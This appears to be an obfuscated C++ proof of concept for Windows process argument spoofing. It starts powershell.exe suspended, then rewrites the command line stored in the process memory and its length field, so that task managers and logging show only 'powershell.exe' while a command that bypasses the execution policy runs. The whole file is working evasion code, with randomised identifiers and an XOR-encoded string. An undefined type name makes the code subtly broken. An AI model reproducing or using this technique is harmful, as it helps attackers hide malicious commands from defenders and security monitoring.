#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>


#pragma comment(lib, "ntdll.lib")
#ifdef _DEBUG
#endif
#ifdef _DEBUG
#endif
namespace {
char _obf_data_0[] = { 37, 58, 34, 48, 39, 38, 61, 48, 57, 57, 123, 48, 45, 48, 0 };
char* _obf_str_table[] = {
_obf_data_0,
};
char _obf_decode_buffer[4096];
const char* _obf_str(int id) {
char* s = _obf_str_table[id];
int i = 0;
for (; s[i] != 0; ++i) _obf_decode_buffer[i] = s[i] ^ 85;
_obf_decode_buffer[i] = 0;
return _obf_decode_buffer;
}
}
extern "C" NTSTATUS NtReadVirtualMemory(
HANDLE _YWG8XDVN,
PVOID _QSN8R5VH,
PVOID _Y3ZNECZH,
ULONG _VQDVZQ4F,
PULONG _LSX1RKWV
);
extern "C" NTSTATUS NtWriteVirtualMemory(
HANDLE _YWG8XDVN,
PVOID _QSN8R5VH,
PVOID _Y3ZNECZH,
ULONG _2X5C1JTR,
PULONG _2IBDGE78
);
extern "C" NTSTATUS NtResumeThread(
HANDLE _8E2LFL2K,
PULONG _2DISGDRA
);
struct CUSTOM_PEB {
BYTE _N90I5ZU5[16];
PVOID _7MNRBE25;
PVOID _O89XGUQL;
PVOID _7LWR2EY7;
};
struct CUSTOM_RTL_USER_PROCESS_PARAMETERS {
BYTE _N90I5ZU5[112];
USHORT _HVG61MD5;
USHORT _7K7PMETK;
PVOID _L0N4V91E;
};
void Debug(const std::wstring& _L2IOXK4S) {
std::wcout << _L2IOXK4S << std::endl;
}
void Debug(const std::wstring& _L2IOXK4S, const std::vector<std::wstring>& _3D83HLX6) {
std::wstring _3VNI2PV9 = _L2IOXK4S;
for (_89QC5FFK _9TXVT6NP = 0; _9TXVT6NP < _3D83HLX6.size(); _9TXVT6NP++) {
std::wstring _7HYI9L84 = L"{" + std::to_wstring(_9TXVT6NP) + L"}";
_89QC5FFK _34R1FBAI = _3VNI2PV9.find(_7HYI9L84);
if (_34R1FBAI != std::wstring::npos) {
_3VNI2PV9.replace(_34R1FBAI, _7HYI9L84.length(), _3D83HLX6[_9TXVT6NP]);
}
}
std::wcout << _3VNI2PV9 << std::endl;
}
std::wstring PadRight(const std::wstring& _1RV3Z0QL, _89QC5FFK _0EGSITCK, wchar_t _SG3XGOHQ) {
if (_1RV3Z0QL.length() >= _0EGSITCK) return _1RV3Z0QL;
return _1RV3Z0QL + std::wstring(_0EGSITCK - _1RV3Z0QL.length(), _SG3XGOHQ);
}
int main() {
std::wstring _B4QXER60 = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
std::wstring _MJTAO39Q = PadRight(L"powershell.exe", _B4QXER60.length(), L' ');
Debug(L"=== COMMAND LINE SPOOFER STARTED ===");
Debug(L"[+] Malicious command length: " + std::to_wstring(_B4QXER60.length()));
Debug(L"[+] Malicious command: " + _B4QXER60);
Debug(L"[+] Spoofed command length: " + std::to_wstring(_MJTAO39Q.length()));
Debug(L"[+] Spoofed command: " + _MJTAO39Q.substr(0, _MJTAO39Q.find_last_not_of(L' ') + 1));
Debug(L"[+] Spoofed command (with padding): " + _MJTAO39Q);
Debug(L"[+] Creating suspended process...");
STARTUPINFOW _LQTZVGZY = { 0 };
_LQTZVGZY.cb = sizeof(_LQTZVGZY);
SECURITY_ATTRIBUTES _0PRHDM6P = { 0 };
_0PRHDM6P.nLength = sizeof(_0PRHDM6P);
PROCESS_INFORMATION _HZ3KE1JN = { 0 };
Debug(L"[+] Calling CreateProcessW with command: " + _MJTAO39Q);
BOOL _5HKPZPZN = CreateProcessW(
NULL,
const_cast<LPWSTR>(_MJTAO39Q.c_str()),
&_0PRHDM6P,
&_0PRHDM6P,
FALSE,
CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
NULL,
L"C:\\windows\\",
&_LQTZVGZY,
&_HZ3KE1JN
);
if (!_5HKPZPZN) {
DWORD _LRTG6EMX = GetLastError();
Debug(L"[!] Unable to spawn process! Error code: " + std::to_wstring(_LRTG6EMX));
return 1;
}
Debug(L"[+] Process spawned successfully!");
Debug(L"[+] Process ID: " + std::to_wstring(_HZ3KE1JN.dwProcessId));
Debug(L"[+] Thread ID: " + std::to_wstring(_HZ3KE1JN.dwThreadId));
Debug(L"[+] Querying process information...");
PROCESS_BASIC_INFORMATION _9ICTVFP5 = { 0 };
ULONG _4OZ9GIHQ = 0;
NTSTATUS _Z9YUVPHC = NtQueryInformationProcess(
_HZ3KE1JN.hProcess,
ProcessBasicInformation,
&_9ICTVFP5,
sizeof(_9ICTVFP5),
&_4OZ9GIHQ
);
if (_Z9YUVPHC != 0) {
Debug(L"[!] Unable to read PEB address! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
CloseHandle(_HZ3KE1JN.hProcess);
CloseHandle(_HZ3KE1JN.hThread);
return 1;
}
Debug(L"[+] NtQueryInformationProcess successful!");
Debug(L"[+] Return length: " + std::to_wstring(_4OZ9GIHQ));
std::wstringstream _SNREUNX9;
_SNREUNX9 << std::hex << _9ICTVFP5.PebBaseAddress;
Debug(L"[+] PEB Address: 0x" + _SNREUNX9.str());
Debug(L"[+] Reading PEB structure...");
CUSTOM_PEB _JTA2L6FL = { 0 };
SIZE_T _5T7EAJQJ = 0;
_Z9YUVPHC = NtReadVirtualMemory(_HZ3KE1JN.hProcess, _9ICTVFP5.PebBaseAddress, &_JTA2L6FL, sizeof(_JTA2L6FL), (PULONG)&_5T7EAJQJ);
if (_Z9YUVPHC != 0) {
Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
CloseHandle(_HZ3KE1JN.hProcess);
CloseHandle(_HZ3KE1JN.hThread);
return 1;
}
Debug(L"[+] PEB structure read successfully! Bytes read: " + std::to_wstring(_5T7EAJQJ));
std::wstringstream _KHO66NN3;
_KHO66NN3 << std::hex << _JTA2L6FL.ProcessParameters;
Debug(L"[+] ProcessParameters Address: 0x" + _KHO66NN3.str());
Debug(L"[+] Reading ProcessParameters structure...");
CUSTOM_RTL_USER_PROCESS_PARAMETERS _720DZJ5C = { 0 };
_Z9YUVPHC = NtReadVirtualMemory(_HZ3KE1JN.hProcess, _JTA2L6FL.ProcessParameters, &_720DZJ5C, sizeof(_720DZJ5C), (PULONG)&_5T7EAJQJ);
if (_Z9YUVPHC != 0) {
Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
CloseHandle(_HZ3KE1JN.hProcess);
CloseHandle(_HZ3KE1JN.hThread);
return 1;
}
Debug(L"[+] ProcessParameters structure read successfully! Bytes read: " + std::to_wstring(_5T7EAJQJ));
Debug(L"[+] CommandLine Length: " + std::to_wstring(_720DZJ5C.Length));
Debug(L"[+] CommandLine MaximumLength: " + std::to_wstring(_720DZJ5C.MaximumLength));
std::wstringstream _C3RMFSV8;
_C3RMFSV8 << std::hex << _720DZJ5C.CommandLine;
Debug(L"[+] CommandLine Address: 0x" + _C3RMFSV8.str());
Debug(L"[+] Reading original command line...");
std::vector<wchar_t> _AF6DSRQM(_720DZJ5C.Length / sizeof(wchar_t));
_Z9YUVPHC = NtReadVirtualMemory(_HZ3KE1JN.hProcess, _720DZJ5C.CommandLine, _AF6DSRQM.data(), _720DZJ5C.Length, (PULONG)&_5T7EAJQJ);
if (_Z9YUVPHC != 0) {
Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
CloseHandle(_HZ3KE1JN.hProcess);
CloseHandle(_HZ3KE1JN.hThread);
return 1;
}
std::wstring _O3SX13DR(_AF6DSRQM.data());
Debug(L"[+] Original CommandLine read successfully! Bytes read: " + std::to_wstring(_5T7EAJQJ));
Debug(L"[+] Original CommandLine: " + _O3SX13DR);
Debug(L"[+] Preparing to write malicious command...");
std::vector<wchar_t> _VY768IOE(_B4QXER60.begin(), _B4QXER60.end());
Debug(L"[+] New command line length: " + std::to_wstring(_VY768IOE.size()));
Debug(L"[+] New command line size in bytes: " + std::to_wstring(_VY768IOE.size() * sizeof(wchar_t)));
SIZE_T _71Y68FLV = 0;
_Z9YUVPHC = NtWriteVirtualMemory(_HZ3KE1JN.hProcess, _720DZJ5C.CommandLine, _VY768IOE.data(), _VY768IOE.size() * sizeof(wchar_t), (PULONG)&_71Y68FLV);
if (_Z9YUVPHC != 0) {
Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
CloseHandle(_HZ3KE1JN.hProcess);
CloseHandle(_HZ3KE1JN.hThread);
return 1;
}
Debug(L"[+] Malicious command written successfully! Bytes written: " + std::to_wstring(_71Y68FLV));
Debug(L"[+] Writing spoofed command length...");
USHORT _6Z34HEDP = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
Debug(L"[+] Spoofed command length (bytes): " + std::to_wstring(_6Z34HEDP));
std::wstringstream _EQ1B91H7;
_EQ1B91H7 << std::hex << (ULONG_PTR)((BYTE*)_JTA2L6FL.ProcessParameters + 112);
Debug(L"[+] Writing to address: 0x" + _EQ1B91H7.str());
_Z9YUVPHC = NtWriteVirtualMemory(_HZ3KE1JN.hProcess, (PVOID)((BYTE*)_JTA2L6FL.ProcessParameters + 112), &_6Z34HEDP, sizeof(_6Z34HEDP), (PULONG)&_71Y68FLV);
if (_Z9YUVPHC != 0) {
Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
CloseHandle(_HZ3KE1JN.hProcess);
CloseHandle(_HZ3KE1JN.hThread);
return 1;
}
Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(_71Y68FLV));
Debug(L"[+] SPOOFING COMPLETE!");
Debug(L"[+] Process will now show as: powershell.exe");
Debug(L"[+] But will actually execute: " + _B4QXER60);
Debug(L"[+] Resuming suspended process...");
ULONG _1JYUF7L6 = 0;
_Z9YUVPHC = NtResumeThread(_HZ3KE1JN.hThread, &_1JYUF7L6);
if (_Z9YUVPHC == 0) {
Debug(L"[+] Process resumed successfully!");
Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(_Z9YUVPHC));
Debug(L"[+] Previous suspend count: " + std::to_wstring(_1JYUF7L6));
} else {
Debug(L"[!] Failed to resume process! NTSTATUS: 0x" + std::to_wstring(_Z9YUVPHC));
}
Debug(L"[+] Check Task Manager - the process should show as 'powershell.exe' but execute the malicious command");
Debug(L"Press a key to end PoC...");
std::wcin.get();
Debug(L"[+] Cleaning up handles...");
CloseHandle(_HZ3KE1JN.hProcess);
CloseHandle(_HZ3KE1JN.hThread);
Debug(L"[+] Cleanup complete!");
return 0;
}